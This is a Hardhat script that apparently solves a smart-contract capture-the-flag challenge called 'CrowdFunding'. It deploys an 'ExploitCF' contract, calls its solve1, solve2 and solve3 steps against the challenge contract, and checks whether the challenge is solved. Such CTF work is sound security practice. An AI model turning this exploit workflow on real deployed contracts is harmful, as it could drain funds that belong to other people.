// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");
const { parseEther } = require("ethers/lib/utils");

async function main() {
  

  //get accounts and verify balances
  const [accounts] = await hre.ethers.getSigners();
  console.log("Signer is: ", accounts.address);

  
  //set addresses for current challenge
  const setupAddress = "0x6c06959586640De3BcdE69BDcEbF2efDa5d3983B";
  const challengeAddress = "0xC2c83168E3bf85A5DEabF25f9f9873085C201C79";
  const challengeName = "CrowdFunding";
  const setupName = "SetupBackup";
  
  
   
  //attach setup
  const setupContract = await hre.ethers.getContractAt(setupName, setupAddress);
  //attach challenge
  const challengeContract = await hre.ethers.getContractAt(challengeName, challengeAddress);
  //attach orderBook
  
  
   
 //verify unsolved
 console.log("Solved before ?: ", await setupContract.isSolved());
 console.log("Starting balance:", await ethers.provider.getBalance(challengeAddress));

  //verify unsolved
  console.log("Solved before ?: ", await setupContract.isSolved());
  console.log("Starting balance:", await ethers.provider.getBalance(challengeAddress));

  //exploit logic
  // deploy exploit contract
  const Exploit = await hre.ethers.getContractFactory("ExploitCF");
  const exploit = await Exploit.deploy(challengeAddress);
  await exploit.deployed();
  console.log("Exploit deployed to:", exploit.address);
  

  
  await exploit.solve1({ value: "1"});
  console.log("Start campaign executed");
  console.log("campaign info", await challengeContract.campaigns(0));
  await exploit.solve2();
  console.log("Campaign stopped");
  console.log("campaign info", await challengeContract.campaigns(0));

  await exploit.solve3({ value: "1"});
  //verify solved
  console.log("Solved after?: ", await setupContract.isSolved());
  

  
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
